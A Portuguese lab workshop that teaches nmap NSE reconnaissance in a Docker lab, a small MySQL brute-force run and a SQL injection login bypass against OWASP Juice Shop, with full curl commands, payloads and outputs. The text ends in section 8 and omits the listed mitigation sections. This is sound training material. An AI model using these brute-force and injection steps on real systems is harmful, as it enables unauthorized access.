# Workshop 03: Nmap NSE na Rede Docker e Exploracao Controlada no OWASP Juice Shop

**Autor:** Charles Alandt

**Contato:** `echo "Y2hhcmxlcy5hbGFuZHRAZ21haWwuY29tCg==" | base64 -d`

**Uso e atribuicao:** este material pode ser copiado, adaptado e utilizado livremente para fins educacionais, desde que a fonte e o autor sejam referenciados.

---

> [!CAUTION]
> **AVISO DE ETICA E RESPONSABILIDADE**
> Este conteudo e ambiente foram elaborados exclusivamente para fins educacionais, laboratoriais e de pesquisa em ambiente controlado.
>
> **Uso estritamente proibido** em sistemas de terceiros, redes publicas ou redes de producao sem autorizacao formal. O uso deste material em qualquer contexto que viole normas legais, politicas corporativas ou limites do laboratorio e de inteira responsabilidade do executor.
>
> **DISCLAIMER DE ESTABILIDADE E SUPORTE:**
> Este laboratorio foi testado e validado pelo instrutor. No entanto, o ecossistema de TI (versoes de kernel, distribuicoes Linux, imagens Docker, ferramentas de rede, versoes de aplicacoes vulneraveis e provedores de virtualizacao) evolui rapidamente.
>
> **Fique atento:**
> - A execucao e permitida apenas em laboratorio isolado (VM dedicada, Docker Lab, NAT/Host-Only ou rede segregada).
> - As tecnicas demonstradas envolvem reconhecimento de rede, enumeracao de servicos, uso de scripts NSE e validacao controlada de vulnerabilidades em aplicacoes vulneraveis por desenho.
> - Ambientes de laboratorio sao sensiveis e dependentes de hardware, configuracao de rede, estado dos containers e versoes de pacotes.
> - Falhas podem ocorrer devido a containers parados, servicos internos indisponiveis, DNS interno, ausencia de ferramentas no container atacante ou conflitos de rede.
> - **Ajustes manuais podem ser necessarios** durante o processo para adequar o lab a sua maquina especifica.

---

## Indice

- [1. Contexto e Objetivo da Aula](#1-contexto-e-objetivo-da-aula)
- [2. Escopo Operacional e Tempo Previsto](#2-escopo-operacional-e-tempo-previsto)
  - [Passo 2.1: Confirmar host, usuario e Docker](#passo-21-confirmar-host-usuario-e-docker)
  - [Passo 2.2: Confirmar container atacante e ferramentas](#passo-22-confirmar-container-atacante-e-ferramentas)
- [3. Fase 1: Inventario Docker e Mapa de Alvos](#3-fase-1-inventario-docker-e-mapa-de-alvos)
  - [Passo 3.1: Listar containers, imagens, status e portas](#passo-31-listar-containers-imagens-status-e-portas)
  - [Passo 3.2: Mapear IPs internos dos containers](#passo-32-mapear-ips-internos-dos-containers)
  - [Passo 3.3: Definir alvos candidatos](#passo-33-definir-alvos-candidatos)
- [4. Fase 2: Descoberta com Nmap e Sintaxe de Alvos](#4-fase-2-descoberta-com-nmap-e-sintaxe-de-alvos)
  - [Passo 4.1: Descobrir hosts ativos na rede Docker](#passo-41-descobrir-hosts-ativos-na-rede-docker)
  - [Passo 4.2: Evitar erro comum com lista de IPs](#passo-42-evitar-erro-comum-com-lista-de-ips)
  - [Passo 4.3: Entender o uso do -sV e -sC](#passo-43-entender-o-uso-do--sv-e--sc)
- [5. Fase 3: Nmap NSE por Perfil de Servico](#5-fase-3-nmap-nse-por-perfil-de-servico)
  - [Passo 5.1: Selecionar scripts NSE relevantes](#passo-51-selecionar-scripts-nse-relevantes)
  - [Passo 5.2: Validar Redis como contraexemplo](#passo-52-validar-redis-como-contraexemplo)
  - [Passo 5.3: Validar MySQL com scripts NSE](#passo-53-validar-mysql-com-scripts-nse)
  - [Passo 5.4: Testar brute force controlado no MySQL com NSE](#passo-54-testar-brute-force-controlado-no-mysql-com-nse)
  - [Passo 5.5: Validar OWASP Juice Shop com scripts HTTP](#passo-55-validar-owasp-juice-shop-com-scripts-http)
- [6. Fase 4: Evidencia Manual com curl](#6-fase-4-evidencia-manual-com-curl)
  - [Passo 6.1: Coletar headers e pagina inicial do Juice Shop](#passo-61-coletar-headers-e-pagina-inicial-do-juice-shop)
  - [Passo 6.2: Interpretar cabecalhos e superficie HTTP](#passo-62-interpretar-cabecalhos-e-superficie-http)
- [7. Fase 5: Exploracao Controlada no Juice Shop](#7-fase-5-exploracao-controlada-no-juice-shop)
  - [Passo 7.1: Preparar payload JSON de login](#passo-71-preparar-payload-json-de-login)
  - [Passo 7.2: Executar login bypass por SQL Injection](#passo-72-executar-login-bypass-por-sql-injection)
  - [Passo 7.3: Registrar evidencia de autenticacao administrativa](#passo-73-registrar-evidencia-de-autenticacao-administrativa)
- [8. Fase 6: Leitura Profissional dos Resultados](#8-fase-6-leitura-profissional-dos-resultados)
  - [8.1 Criterios para afirmar que a invasao e possivel](#81-criterios-para-afirmar-que-a-invasao-e-possivel)
- [9. Mitigacao, Deteccao e Hardening](#9-mitigacao-deteccao-e-hardening)
  - [9.1 Reduzir exposicao de servicos Docker](#91-reduzir-exposicao-de-servicos-docker)
  - [9.2 Corrigir SQL Injection](#92-corrigir-sql-injection)
  - [9.3 Endurecer respostas HTTP](#93-endurecer-respostas-http)
  - [9.4 Detectar varredura e exploracao](#94-detectar-varredura-e-exploracao)
- [Checklist de Validacao da Aula](#checklist-de-validacao-da-aula)

---

## 1. Contexto e Objetivo da Aula

Nas aulas anteriores, reconhecemos o host `srvdocker01`, identificamos Docker, mapeamos containers, validamos FTP vulneravel no Metasploitable2 e exploramos SQL Injection no DVWA. Agora vamos evoluir a abordagem: usar `nmap` com scripts NSE de forma seletiva para transformar descoberta de rede em priorizacao tecnica, e fechar a aula com uma exploracao simples e controlada no OWASP Juice Shop.

O objetivo nao e "rodar todos os scripts contra tudo". Isso e barulhento, lento e tecnicamente pobre. Vamos trabalhar como em uma investigacao profissional: descobrir, classificar, testar por perfil de servico, interpretar limites da ferramenta e entao validar uma falha real com `curl`.

**Resultado esperado:**

- Mapear containers e IPs internos da rede Docker.
- Usar `nmap` de forma seletiva, evitando scans amplos desnecessarios.
- Entender como escolher scripts NSE por perfil de servico.
- Diferenciar container ativo de servico realmente exposto.
- Coletar evidencias HTTP com `curl`.
- Explorar, de forma controlada, um login bypass por SQL Injection no OWASP Juice Shop.
- Registrar evidencias, impactos e mitigacoes.

---

## 2. Escopo Operacional e Tempo Previsto

Este workshop foi planejado para aproximadamente **1h30**.

| Bloco | Tempo sugerido | Objetivo |
|---|---:|---|
| Contexto e inventario Docker | 10 min | Confirmar ambiente, containers e rede |
| Descoberta com Nmap | 15 min | Mapear hosts e corrigir erros comuns de sintaxe |
| NSE por perfil de servico | 25 min | Testar Redis, MySQL e HTTP de forma seletiva |
| Evidencia manual HTTP | 10 min | Confirmar Juice Shop com `curl` |
| Exploracao controlada | 20 min | Executar login bypass no Juice Shop |
| Mitigacao e fechamento | 10 min | Discutir reducao de risco e deteccao |

No ambiente validado para esta aula, foram observados:

- Host Docker: `srvdocker01`
- Rede Docker vulneravel: `docker_lab_vulneravel`
- Subrede Docker: `172.18.0.0/16`
- Container atacante: `atacante_kali`
- IP do atacante no lab: `172.18.0.21`
- OWASP Juice Shop: `lab_juice_shop`
- IP do Juice Shop no lab: `172.18.0.30`
- Porta do Juice Shop: `3000/tcp`
- Banco MySQL do vAPI: `lab_vapi_db`
- IP do MySQL do vAPI: `172.18.0.41`
- Redis do stack Greenbone: `docker-redis-server-1`
- IP do Redis no lab: `172.18.0.6`

**Observacao:** os nomes e IPs podem mudar conforme o laboratorio. Ajuste todos os comandos com base nas saidas obtidas durante a aula.

### Passo 2.1: Confirmar host, usuario e Docker

```bash
hostname
whoami
id
docker version
docker network ls
```

**Componentes dos comandos:**

- `hostname`: confirma o host atual.
- `whoami`: confirma o usuario efetivo.
- `id`: mostra UID, GID e grupos do usuario.
- `docker version`: valida comunicacao com o Docker Engine.
- `docker network ls`: lista redes Docker disponiveis.

**Resultado esperado:** devemos estar no `srvdocker01`, com acesso ao Docker Engine e com a rede `docker_lab_vulneravel` disponivel.

**Analise:** antes de varrer qualquer rede, confirmamos onde estamos. Confundir host Docker, container atacante e alvo e um erro classico. O contexto de execucao e parte da evidencia.

### Passo 2.2: Confirmar container atacante e ferramentas

```bash
docker exec atacante_kali sh -lc 'hostname; ip -br addr; command -v nmap; command -v curl'
```

**Componentes do comando:**

- `docker exec atacante_kali`: executa comandos dentro do container atacante.
- `sh -lc`: abre shell nao interativo com interpretacao dos comandos.
- `hostname`: mostra o nome do container.
- `ip -br addr`: mostra interfaces e IPs de forma compacta.
- `command -v nmap`: verifica se o `nmap` existe.
- `command -v curl`: verifica se o `curl` existe.

**Resultado esperado:** o container atacante deve estar na rede Docker vulneravel e deve possuir `nmap` e `curl`.

Se alguma ferramenta estiver ausente:

```bash
docker exec atacante_kali sh -lc 'apt update && DEBIAN_FRONTEND=noninteractive apt install -y nmap curl'
```

**Analise:** o container atacante representa nossa estacao de teste. Validar ferramentas antes da aula evita improviso no meio da demonstracao.

---

## 3. Fase 1: Inventario Docker e Mapa de Alvos

Nesta fase vamos transformar a lista de containers em um mapa de alvos. Nem todo container ativo e um alvo interessante. Nem todo servico exposto merece exploit. O objetivo e selecionar candidatos com base em evidencias.

### Passo 3.1: Listar containers, imagens, status e portas

```bash
docker ps --format 'table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}'
```

**Componentes do comando:**

- `docker ps`: lista containers em execucao.
- `--format`: define uma saida tabular objetiva.
- `{{.Names}}`: nome do container.
- `{{.Image}}`: imagem usada.
- `{{.Status}}`: tempo e estado do container.
- `{{.Ports}}`: portas publicadas no host.

**Resultado validado no laboratorio:**

```text
NAMES                  IMAGE                         STATUS       PORTS
atacante_kali          kalilinux/kali-rolling        Up 2 weeks
lab_juice_shop         bkimminich/juice-shop         Up 2 weeks   0.0.0.0:3000->3000/tcp
lab_dvwa               vulnerables/web-dvwa          Up 2 weeks   0.0.0.0:8080->80/tcp
lab_vapi_www           docker-vapi-www               Up 2 weeks   0.0.0.0:8000->80/tcp
lab_vapi_db            mysql:8.0                     Up 2 weeks   0.0.0.0:3307->3306/tcp
lab_phpmyadmin         phpmyadmin/phpmyadmin         Up 2 weeks   0.0.0.0:8001->80/tcp
lab_portainer          portainer/portainer-ce        Up 2 weeks   0.0.0.0:9443->9443/tcp
```

**Analise:** esta saida mostra tecnologias e superficies provaveis: aplicacao web vulneravel, banco de dados, painel administrativo, phpMyAdmin e ambiente de apoio. Para esta aula, o alvo principal sera o `lab_juice_shop`, porque ele esta saudavel, responde pela rede Docker e permite exploracao controlada por CLI.

### Passo 3.2: Mapear IPs internos dos containers

```bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}} {{.Name}} {{.Config.Image}}' $(docker ps -q) | sort -V
```

**Componentes do comando:**

- `docker inspect`: consulta metadados dos containers.
- `-f`: aplica template Go para extrair campos especificos.
- `{{.NetworkSettings.Networks}}{{.IPAddress}}`: mostra IP atribuido em redes Docker.
- `{{.Name}}`: mostra nome do container.
- `{{.Config.Image}}`: mostra imagem usada.
- `$(docker ps -q)`: passa todos os IDs de containers em execucao.
- `sort -V`: ordena naturalmente por versao/IP.

**Resultado validado no laboratorio:**

```text
172.18.0.2 /lab_portainer portainer/portainer-ce:latest
172.18.0.6 /docker-redis-server-1 registry.community.greenbone.net/community/redis-server
172.18.0.30 /lab_juice_shop bkimminich/juice-shop
172.18.0.40 /lab_vapi_www docker-vapi-www
172.18.0.41 /lab_vapi_db mysql:8.0
172.18.0.42 /lab_phpmyadmin phpmyadmin/phpmyadmin
```

**Analise:** aqui saimos da visao de portas publicadas no host e entramos na rede interna Docker. O `nmap` executado pelo `atacante_kali` deve usar esses IPs internos, nao necessariamente as portas publicadas no host.

### Passo 3.3: Definir alvos candidatos

| Alvo | IP validado | Servico esperado | Uso na aula |
|---|---:|---|---|
| `lab_juice_shop` | `172.18.0.30` | HTTP `3000/tcp` | Alvo principal |
| `lab_vapi_db` | `172.18.0.41` | MySQL `3306/tcp` | Reconhecimento NSE |
| `docker-redis-server-1` | `172.18.0.6` | Redis `6379/tcp` | Contraexemplo |
| `lab_vapi_www` | `172.18.0.40` | HTTP `80/tcp` | Triagem |
| `lab_phpmyadmin` | `172.18.0.42` | HTTP `80/tcp` | Triagem |

**Analise:** a aula deve ensinar decisao. Redis apareceu como container ativo, mas a porta pode estar fechada. MySQL respondeu bem a scripts NSE, mas nao apresentou senha vazia. vAPI respondeu HTTP, mas a API retornou erro de banco no teste validado. Juice Shop respondeu corretamente e permitiu exploracao controlada. Esse e o tipo de raciocinio que diferencia varredura de analise.

---

## 4. Fase 2: Descoberta com Nmap e Sintaxe de Alvos

### Passo 4.1: Descobrir hosts ativos na rede Docker

```bash
docker exec atacante_kali sh -lc 'mkdir -p /tmp/evidencias/workshop-03 && nmap -sn -v 172.18.0.0/24 -oN /tmp/evidencias/workshop-03/host-discovery.txt'
```

**Flags e componentes utilizados:**

- `-sn`: faz descoberta de hosts sem varrer portas.
- `-v`: modo verboso.
- `172.18.0.0/24`: recorte reduzido da rede Docker para manter a aula objetiva.
- `-oN`: salva a saida em formato normal do Nmap.

**Analise:** mesmo que a rede Docker seja `/16`, comecar por `/24` reduz tempo e ruido. Em laboratorio, isso e didatico. Em ambiente profissional, escopo e autorizacao definem o tamanho da varredura.

### Passo 4.2: Evitar erro comum com lista de IPs

Este comando esta **incorreto**:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 80 172.18.0.2,172.18.0.30'
```

**Resultado validado no laboratorio:**

```text
Failed to resolve "172.18.0.2,172.18.0.30".
WARNING: No targets were specified, so 0 hosts scanned.
```

Forma correta, com IPs separados por espaco:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 80,3000 172.18.0.2 172.18.0.30'
```

**Analise:** o Nmap interpreta `172.18.0.2,172.18.0.30` como um unico nome de host, nao como uma lista. Parece pequeno, mas em aula isso evita perda de tempo. IPs separados por espaco funcionam. Para ranges, use sintaxe apropriada como `172.18.0.1-50` ou CIDR como `172.18.0.0/24`.

### Passo 4.3: Entender o uso do -sV e -sC

Depois da descoberta inicial, podemos enriquecer a leitura com deteccao de versao e scripts padrao do Nmap. Este comando nao deve ser tratado como "magia de vulnerabilidade"; ele serve para coletar contexto tecnico sobre servicos especificos.

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -sV -sC -p 80,3000,3306,6379,8000,9000,9443 172.18.0.2 172.18.0.6 172.18.0.30 172.18.0.40 172.18.0.41 172.18.0.42'
```

**Flags e componentes utilizados:**

- `-Pn`: assume que os hosts estao ativos e pula a etapa de ping discovery.
- `-sV`: tenta identificar o servico e a versao por meio de probes especificos.
- `-sC`: executa o conjunto padrao de scripts NSE, equivalente a `--script default`.
- `-p 80,3000,3306,6379,8000,9000,9443`: limita a varredura as portas de interesse.
- `172.18.0.2 172.18.0.6 ...`: lista de alvos separados por espaco.

**Analise:** `-sV` responde "o que esta rodando aqui?". `-sC` adiciona uma camada de verificacoes padrao, como banners, titulos HTTP, informacoes de protocolo e pequenas enumeracoes seguras. A leitura profissional e usar esse comando quando ja temos alvos e portas candidatos; depois disso, refinamos por perfil: Redis com scripts Redis, MySQL com scripts MySQL, HTTP com scripts HTTP.

---

## 5. Fase 3: Nmap NSE por Perfil de Servico

O NSE (Nmap Scripting Engine) permite executar scripts de descoberta, seguranca, enumeracao e validacao. O ponto profissional e escolher scripts coerentes com o servico. Rodar `--script vuln` contra tudo costuma ser menos eficiente do que selecionar scripts por tecnologia.

### Passo 5.1: Selecionar scripts NSE relevantes

Listar scripts HTTP:

```bash
docker exec atacante_kali sh -lc 'ls /usr/share/nmap/scripts/http-* | sed -n "1,80p"'
```

Listar scripts MySQL:

```bash
docker exec atacante_kali sh -lc 'ls /usr/share/nmap/scripts/mysql-* | sed -n "1,80p"'
```

Listar scripts Redis:

```bash
docker exec atacante_kali sh -lc 'ls /usr/share/nmap/scripts/redis-* | sed -n "1,80p"'
```

Consultar ajuda de um script:

```bash
docker exec atacante_kali sh -lc 'nmap --script-help http-cors | sed -n "1,120p"'
```

**Analise:** antes de executar um script, leia o que ele faz. Scripts NSE variam de `safe` a `intrusive`. Em laboratorio isso vira aprendizado; em ambiente real isso vira responsabilidade.

Tambem podemos baixar, escrever ou adaptar scripts NSE e informar ao Nmap onde eles estao. Isso permite "turbinar" o Nmap com verificacoes especificas do laboratorio, de uma aplicacao interna ou de uma CVE que ainda nao esta coberta pela instalacao padrao.

Exemplo com script em caminho absoluto:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 3000 --script /tmp/meu-script-http.nse 172.18.0.30'
```

Exemplo apos copiar um script para o diretorio padrao do Nmap:

```bash
docker exec atacante_kali sh -lc 'nmap --script-updatedb'
```

**Reflexao de seguranca:** script NSE e codigo Lua executado pelo Nmap. Antes de usar script baixado da internet, revise o conteudo, origem, argumentos aceitos e categoria operacional. Um Nmap "turbinado" sem revisao pode virar uma fonte de falso positivo, instabilidade ou comportamento intrusivo fora do esperado.

### Passo 5.2: Validar Redis como contraexemplo

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -sV -p 6379 --script redis-info 172.18.0.6 -oN /tmp/evidencias/workshop-03/redis-info.txt'
```

**Flags e componentes utilizados:**

- `-Pn`: trata o host como ativo.
- `-sV`: tenta identificar versao do servico.
- `-p 6379`: limita a varredura a Redis.
- `--script redis-info`: tenta coletar informacoes do Redis.

**Resultado validado no laboratorio:**

```text
PORT     STATE  SERVICE VERSION
6379/tcp closed redis
```

**Analise:** o container Redis existe, mas a porta `6379/tcp` apareceu fechada a partir do `atacante_kali`. Isso e um resultado importante. Container ativo nao e igual a servico acessivel. Aqui nao ha exploracao; ha triagem correta.

### Passo 5.3: Validar MySQL com scripts NSE

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -sV -p 3306 --script mysql-info,mysql-empty-password 172.18.0.41 -oN /tmp/evidencias/workshop-03/mysql-vapi.txt'
```

**Scripts utilizados:**

- `mysql-info`: coleta informacoes de versao, protocolo, capabilities e plugin de autenticacao.
- `mysql-empty-password`: testa autenticacao com senha vazia.

**Resultado validado no laboratorio:**

```text
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 8.0.46
| mysql-info:
|   Protocol: 10
|   Version: 8.0.46
|   Capabilities flags: 65535
|   Status: Autocommit
|_  Auth Plugin Name: mysql_native_password
```

**Analise:** o MySQL respondeu e revelou versao, plugin de autenticacao e capacidades. Isso e evidencia util para inventario e hardening. O script de senha vazia nao retornou achado exploravel no teste validado. O proximo passo didatico e testar uma hipotese controlada: sera que credenciais obvias aparecem com um dicionario minimo?

### Passo 5.4: Testar brute force controlado no MySQL com NSE

O Nmap possui scripts de brute force, mas esta classe deve ser tratada como intrusiva. Aqui vamos usar apenas cinco usuarios e cinco senhas, com uma unica porta e um unico alvo, para demonstrar mecanismo, evidencia e limite.

Crie um arquivo pequeno de usuarios:

```bash
docker exec atacante_kali sh -lc 'mkdir -p /tmp/evidencias/workshop-03; printf "root\nadmin\nvapi\nmysql\napp\n" > /tmp/evidencias/workshop-03/mysql-users.txt'
```

Crie um arquivo pequeno de senhas:

```bash
docker exec atacante_kali sh -lc 'printf "root\nadmin\npassword\nvapi\n123456\n" > /tmp/evidencias/workshop-03/mysql-passwords.txt'
```

Execute o `mysql-brute` com escopo restrito:

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -p 3306 --script mysql-brute --script-args userdb=/tmp/evidencias/workshop-03/mysql-users.txt,passdb=/tmp/evidencias/workshop-03/mysql-passwords.txt,brute.firstonly=true,brute.threads=1 172.18.0.41 -oN /tmp/evidencias/workshop-03/mysql-brute-mini.txt'
```

**Flags e componentes utilizados:**

- `--script mysql-brute`: executa tentativa de autenticacao contra MySQL.
- `userdb=...`: aponta para o arquivo de usuarios.
- `passdb=...`: aponta para o arquivo de senhas.
- `brute.firstonly=true`: interrompe a busca apos o primeiro achado valido.
- `brute.threads=1`: reduz paralelismo e deixa a demonstracao mais controlada.
- `-oN`: salva a saida em formato normal para evidencia.

**Resultado validado no laboratorio:**

```text
PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-brute:
|   Accounts: No valid accounts found
|_  Statistics: Performed 27 guesses in 1 seconds, average tps: 27.0
```

**Analise:** o teste demonstrou a tecnica, mas nao encontrou credenciais validas. Isso tambem e evidencia. Em um relatorio profissional, registramos que houve tentativa controlada com dicionario minimo e que nao foi confirmada autenticacao fraca nesse escopo. Nao aumentamos wordlist, threads ou tempo sem objetivo claro, porque isso muda a natureza da atividade.

### Passo 5.5: Validar OWASP Juice Shop com scripts HTTP

```bash
docker exec atacante_kali sh -lc 'nmap -Pn -sV -p 3000 --script http-title,http-headers,http-cors 172.18.0.30 -oN /tmp/evidencias/workshop-03/juice-nmap-http.txt'
```

**Scripts utilizados:**

- `http-title`: tenta identificar o titulo da aplicacao.
- `http-headers`: coleta cabecalhos HTTP.
- `http-cors`: avalia comportamento CORS observado.

**Resultado validado no laboratorio:**

```text
PORT     STATE SERVICE VERSION
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Feature-Policy: payment 'self'
|     X-Recruiting: /#/jobs
|     Content-Type: text/html; charset=UTF-8
|     <title>OWASP Juice Shop</title>
```

**Analise:** o Nmap nao classificou perfeitamente o servico, aparecendo como `ppp?`, mas capturou dados suficientes para identificar uma aplicacao web real. Isso e comum: deteccao de servico nao e infalivel. A evidencia importante esta nos headers, no titulo e na resposta HTTP.

---

## 6. Fase 4: Evidencia Manual com curl

O `nmap` apontou o alvo. Agora validamos manualmente com `curl`, que nos permite controlar requisicoes, headers, corpo e evidencias.

### Passo 6.1: Coletar headers e pagina inicial do Juice Shop

```bash
docker exec atacante_kali sh -lc 'curl -sS -i http://172.18.0.30:3000/ | tee /tmp/evidencias/workshop-03/juice-home.txt | sed -n "1,35p"'
```

**Flags e componentes utilizados:**

- `curl`: cliente HTTP CLI.
- `-sS`: modo silencioso, mas exibindo erros.
- `-i`: inclui headers HTTP na saida.
- `tee`: salva evidencia e mostra na tela.
- `sed -n "1,35p"`: limita exibicao para nao despejar a pagina inteira no terminal.

**Resultado validado no laboratorio:**

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=UTF-8

<title>OWASP Juice Shop</title>
```

### Passo 6.2: Interpretar cabecalhos e superficie HTTP

**Pontos relevantes:**

- `HTTP/1.1 200 OK`: a aplicacao responde.
- `Access-Control-Allow-Origin: *`: CORS permissivo observado na resposta.
- `X-Content-Type-Options: nosniff`: header defensivo presente.
- `X-Frame-Options: SAMEORIGIN`: protecao basica contra clickjacking.
- `X-Recruiting: /#/jobs`: header curioso que revela rota da propria aplicacao.
- `<title>OWASP Juice Shop</title>`: confirma o alvo.

**Analise:** a resposta HTTP ja nos permite identificar tecnologia, comportamento de seguranca e pistas de aplicacao. O `nmap` foi o radar; o `curl` e a lupa.

## 7. Fase 5: Exploracao Controlada no Juice Shop

Nesta etapa vamos demonstrar um login bypass por SQL Injection no OWASP Juice Shop. A exploracao e limitada, sem persistencia, sem alteracao de dados e sem tentativa de movimentacao lateral.

**Objetivo tecnico:** provar que uma entrada manipulada no campo `email` pode alterar a logica da consulta de autenticacao e retornar uma sessao administrativa.

**Entendendo o payload usado:**

```json
{"email":"' or 1=1--","password":"qualquer"}
```

Esse payload e um corpo JSON enviado para o endpoint de login. Ele possui dois campos esperados pela aplicacao: `email` e `password`. A diferenca esta no valor do campo `email`, que nao representa um e-mail real; ele foi construido para testar se a aplicacao trata entrada do usuario como dado ou se mistura essa entrada diretamente com a logica SQL.

Suponha que uma aplicacao vulneravel monte a consulta SQL de forma insegura, concatenando diretamente os valores recebidos:

```sql
SELECT *
FROM usuarios
WHERE email = '$email'
AND password = '$password';
```

Substituindo os valores recebidos no nosso payload:

```sql
SELECT *
FROM usuarios
WHERE email = '' or 1=1--'
AND password = 'qualquer';
```

**Significado dos elementos:**

O caractere `'` fecha a string que a propria aplicacao abriu:

```sql
email = ''
```

O trecho `or 1=1` cria uma condicao sempre verdadeira:

```sql
email = '' OR 1=1
```

Como `1=1` e sempre verdadeiro, a clausula `WHERE` passa a corresponder a registros mesmo sem conhecermos um e-mail e uma senha validos.

O trecho `--` inicia um comentario SQL. Tudo apos ele deixa de ser avaliado pelo banco naquele comando:

```sql
AND password = 'qualquer'
```

Ou seja, em uma aplicacao vulneravel, a consulta efetiva pode ficar logicamente parecida com:

```sql
SELECT *
FROM usuarios
WHERE email = '' OR 1=1;
```

**Resultado esperado em sistemas vulneraveis:** o banco retorna registros sem validar a senha. Em fluxos de login mal implementados, a aplicacao pode aceitar o primeiro usuario retornado pela consulta. No Juice Shop validado em laboratorio, esse comportamento retornou autenticacao como `admin@juice-sh.op`.

**Por que geralmente isso nao funciona em aplicacoes modernas bem implementadas?**

Frameworks e bibliotecas atuais normalmente usam controles como:

- Prepared Statements.
- Parameterized Queries.
- ORM, como Django ORM, SQLAlchemy, Hibernate ou Entity Framework.

Exemplo seguro:

```python
cursor.execute(
    "SELECT * FROM usuarios WHERE email=%s AND password=%s",
    (email, password)
)
```

Nesse caso, o valor abaixo e tratado apenas como texto literal:

```text
' or 1=1--
```

Ele nao e interpretado como codigo SQL, nao fecha string, nao cria condicao booleana e nao comenta o restante da consulta.

**Como sabemos que o Juice Shop estava vulneravel neste ponto?**

Nao concluimos isso apenas pelo `nmap`. O `nmap` ajudou a encontrar e identificar a aplicacao web. A validacao da vulnerabilidade veio da evidencia HTTP:

- confirmamos que o alvo respondia em `172.18.0.30:3000`;
- identificamos a aplicacao como `OWASP Juice Shop`, que e vulneravel por desenho para fins educacionais;
- enviamos uma requisicao controlada ao endpoint `/rest/user/login`;
- usamos o payload no campo `email`;
- recebemos `HTTP/1.1 200 OK`;
- a resposta retornou um `token` de autenticacao;
- a resposta indicou `umail":"admin@juice-sh.op"`.

Essa cadeia de evidencias demonstra impacto. Portanto, a conclusao nao e "parece vulneravel"; a conclusao e: neste laboratorio, com esse payload e nesse endpoint, a aplicacao retornou autenticacao administrativa sem validacao correta da senha.

### Passo 7.1: Preparar payload JSON de login

Crie o arquivo de payload dentro do container atacante:

```bash
docker exec atacante_kali sh -lc 'printf "%b" "\173\042email\042:\042\047 or 1=1--\042,\042password\042:\042qualquer\042\175" > /tmp/evidencias/workshop-03/juice-login-payload.json'
```

Confira o conteudo:

```bash
docker exec atacante_kali sh -lc 'cat /tmp/evidencias/workshop-03/juice-login-payload.json'
```

**Resultado esperado:**

```json
{"email":"' or 1=1--","password":"qualquer"}
```

**Componentes do comando:**

- `printf "%b"`: interpreta sequencias escapadas.
- `\173`: caractere `{`.
- `\042`: caractere `"`.
- `\047`: caractere `'`.
- `> /tmp/evidencias/workshop-03/juice-login-payload.json`: salva o JSON em arquivo.

**Analise:** poderiamos escrever esse JSON manualmente, mas este formato evita erro comum de aspas quando o comando passa por `docker exec`, `sh -lc` e JSON ao mesmo tempo. Na validacao, uma primeira tentativa com escape incorreto gerou erro `SyntaxError: Bad escaped character in JSON`, o que reforca a importancia de validar payload e formato antes de culpar a aplicacao.

### Passo 7.2: Executar login bypass por SQL Injection

```bash
docker exec atacante_kali sh -lc 'curl -sS -i -H "Content-Type: application/json" --data-binary @/tmp/evidencias/workshop-03/juice-login-payload.json http://172.18.0.30:3000/rest/user/login | tee /tmp/evidencias/workshop-03/juice-login-sqli.txt | sed -n "1,80p"'
```

**Flags e componentes utilizados:**

- `-i`: inclui headers HTTP.
- `-H "Content-Type: application/json"`: informa que o corpo e JSON.
- `--data-binary @arquivo`: envia o payload exatamente como salvo.
- `/rest/user/login`: endpoint de autenticacao do Juice Shop.
- `tee`: salva a evidencia e exibe na tela.

**Resultado validado no laboratorio:**

```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8

{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...","bid":1,"umail":"admin@juice-sh.op"}}
```

**Analise:** o retorno `HTTP/1.1 200 OK`, junto com `umail":"admin@juice-sh.op"` e um `token`, comprova autenticacao administrativa sem conhecer a senha real. Esta e a evidencia de impacto. O objetivo aqui nao e usar o token para acoes destrutivas; e demonstrar que a autenticacao foi contornada.

### Passo 7.3: Registrar evidencia de autenticacao administrativa

Extraia apenas os campos mais relevantes:

```bash
docker exec atacante_kali sh -lc 'grep -Eo "\"umail\":\"[^\"]+\"|\"bid\":[0-9]+|\"token\":\"[^\"]+" /tmp/evidencias/workshop-03/juice-login-sqli.txt | sed -n "1,20p"'
```

**Resultado esperado:**

```text
"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...
"bid":1
"umail":"admin@juice-sh.op"
```

**Evidencia minima para relatorio:**

```text
Alvo: lab_juice_shop
IP: 172.18.0.30
Porta: 3000/tcp
Aplicacao: OWASP Juice Shop
Endpoint: /rest/user/login
Payload: {"email":"' or 1=1--","password":"qualquer"}
Resultado: HTTP 200 OK
Impacto: autenticacao como admin@juice-sh.op
Ferramentas: nmap, nmap NSE, curl
Arquivos: /tmp/evidencias/workshop-03/juice-nmap-http.txt, juice-home.txt, juice-login-sqli.txt
```

**Reflexao de seguranca:** este e o tipo de falha que um scanner de infraestrutura pode nao "explorar" sozinho. O Nmap ajudou a encontrar e classificar a superficie. A exploracao nasceu da compreensao do fluxo HTTP, do endpoint de login e do comportamento de entrada. Scanner orienta; analise confirma.

---

## 8. Fase 6: Leitura Profissional dos Resultados

Durante a validacao do laboratorio, observamos quatro situacoes diferentes:

| Alvo | Resultado | Decisao |
|---|---|---|
| Redis `172.18.0.6:6379` | Porta fechada | Sem exploracao; registrar como contraexemplo |
| MySQL `172.18.0.41:3306` | Versao e capabilities expostas | Registrar exposicao e hardening |
